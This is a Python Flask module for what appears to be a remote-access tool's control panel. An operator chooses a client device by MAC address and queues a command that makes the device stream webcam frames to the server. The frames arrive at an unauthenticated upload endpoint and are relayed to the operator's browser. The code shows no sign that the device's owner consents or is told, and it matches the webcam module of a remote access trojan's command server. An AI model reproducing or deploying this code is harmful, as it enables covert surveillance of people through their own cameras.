from flask import Blueprint, request, render_template_string, session, redirect, url_for, jsonify, Response
import time
from core import clients_db, save_db
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('camera', __name__)


@bp.route('/camera/<mac>')
def camera_page(mac):
    if not session.get('logged_in'):
        return redirect(url_for('auth.login'))
    if mac not in clients_db:
        return "Device not found"
    html = """
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Camera - {{ info.name }} ({{ mac }})</title>
    <style>{{ admin_css|safe }}body{text-align:center}.camera-wrap{max-width:980px;margin:0 auto;padding:18px}.camera-card{background:#fff;border:1px solid var(--line);border-radius:8px;padding:14px}.camera-controls{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:center;margin:12px 0}.camera-controls select{width:auto;min-width:130px}#cameraImg{width:100%;height:auto;max-width:100%;border:1px solid var(--line);border-radius:8px;box-shadow:0 4px 12px rgba(15,23,42,.12);margin-top:10px;background:#000;object-fit:contain}@media(max-width:640px){.camera-controls select,.camera-controls button{width:100%}}</style></head>
    <body onunload="stopCamera()"><main class="camera-wrap"><div class="header"><div><b>Camera</b><br><span class="subtle">{{ info.name }} [{{ mac }}]</span></div><a class="btn muted" href="/">Back</a></div><section class="camera-card"><div class="camera-controls"><label>Quality <select id="qualitySelect"><option value="25">25% light</option><option value="45" selected>45% balanced</option><option value="70">70% high</option><option value="90">90% source</option></select></label><button id="startBtn" class="btn" onclick="startCamera()">Start Camera</button><button id="stopBtn" class="btn danger" onclick="stopCamera()" disabled>Stop Camera</button></div><div><span id="statusText" class="subtle">Click Start Camera to request webcam frames.</span><span id="fpsText" style="color:#dc2626;font-weight:700;margin-left:12px"></span></div><img id="cameraImg" src="" alt="Waiting for camera" style="display:none"></section></main>
    <script>
    let fpsInterval=null;function startCamera(){var bs=document.getElementById('startBtn'),bp=document.getElementById('stopBtn'),st=document.getElementById('statusText'),qual=document.getElementById('qualitySelect').value;bs.disabled=true;bp.disabled=false;st.innerText='Requesting camera process...';fetch('/api/camera/start/{{ mac }}?q='+qual,{method:'POST'}).then(r=>r.json()).then(data=>{if(data.status==='ok'){st.innerText='Command sent. Waiting for frames...';var img=document.getElementById('cameraImg');img.style.display='inline-block';setTimeout(()=>{img.src='/camera_video/{{ mac }}?t='+Date.now();st.innerText='Streaming camera';fpsInterval=setInterval(pollFps,1000)},1200)}else{st.innerText='Command failed';bs.disabled=false;bp.disabled=true}}).catch(e=>{st.innerText='Network error: '+e;bs.disabled=false;bp.disabled=true})}function stopCamera(){document.getElementById('startBtn').disabled=false;document.getElementById('stopBtn').disabled=true;document.getElementById('statusText').innerText='Camera stopped';document.getElementById('cameraImg').style.display='none';document.getElementById('cameraImg').src='';document.getElementById('fpsText').innerText='';if(fpsInterval)clearInterval(fpsInterval);fetch('/api/camera/stop/{{ mac }}',{method:'POST',keepalive:true})}function pollFps(){fetch('/api/camera/fps/{{ mac }}').then(r=>r.json()).then(data=>{document.getElementById('fpsText').innerText='FPS: '+data.fps})}
    </script></body></html>
    """
    return render_template_string(html, admin_css=ADMIN_CSS, mac=mac, info=clients_db[mac])


@bp.route('/api/camera/start/<mac>', methods=['POST'])
def api_camera_start(mac):
    if not session.get('logged_in'):
        return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['camera_active'] = True
        clients_db[mac]['camera_frame'] = b''
        q = request.args.get('q', '45')
        upload_url = f"{request.host_url.rstrip('/')}/api/camera/upload/{mac}?q={q}"
        clients_db[mac]['pending_file_cmd'] = f"F_CMD:CAMERA_STREAM:{upload_url}"
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})


@bp.route('/api/camera/stop/<mac>', methods=['POST'])
def api_camera_stop(mac):
    if not session.get('logged_in'):
        return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['camera_active'] = False
        save_db()
    return jsonify({"status": "ok"})


@bp.route('/api/camera/upload/<mac>', methods=['POST'])
def camera_upload(mac):
    try:
        if mac in clients_db:
            frame_data = request.data
            if not clients_db[mac].get('camera_active', False):
                return "STOP", 200
            if frame_data:
                clients_db[mac]['camera_frame'] = frame_data
                now = time.time()
                if 'camera_fps_start' not in clients_db[mac] or now - clients_db[mac].get('camera_fps_start', now) > 2.0:
                    clients_db[mac]['camera_fps_start'] = now
                    clients_db[mac]['camera_frames'] = 0
                clients_db[mac]['camera_frames'] += 1
                elapsed = now - clients_db[mac]['camera_fps_start']
                if elapsed >= 1.0:
                    clients_db[mac]['camera_fps'] = clients_db[mac]['camera_frames'] / elapsed
                    clients_db[mac]['camera_fps_start'] = now
                    clients_db[mac]['camera_frames'] = 0
            return "OK", 200
    except Exception as e:
        print("Camera exception:", e)
    return "OK", 200


@bp.route('/api/camera/fps/<mac>')
def api_camera_fps(mac):
    if not session.get('logged_in'):
        return jsonify({"fps": 0})
    if mac in clients_db:
        return jsonify({"fps": round(clients_db[mac].get('camera_fps', 0), 1)})
    return jsonify({"fps": 0})


def generate_camera_mjpeg(mac):
    yield b'--frame\r\n'
    last_frame = b''
    while clients_db.get(mac, {}).get('camera_active', False):
        frame = clients_db.get(mac, {}).get('camera_frame', b'')
        if frame and frame != last_frame:
            last_frame = frame
            yield (b'Content-Type: image/jpeg\r\n'
                   b'Content-Length: ' + str(len(frame)).encode() + b'\r\n\r\n' +
                   frame + b'\r\n--frame\r\n')
        else:
            time.sleep(0.03)


@bp.route('/camera_video/<mac>')
def camera_video(mac):
    if not session.get('logged_in'):
        return "未登录", 403
    if mac in clients_db:
        clients_db[mac]['camera_active'] = True
        save_db()
        return Response(generate_camera_mjpeg(mac), mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Error", 404
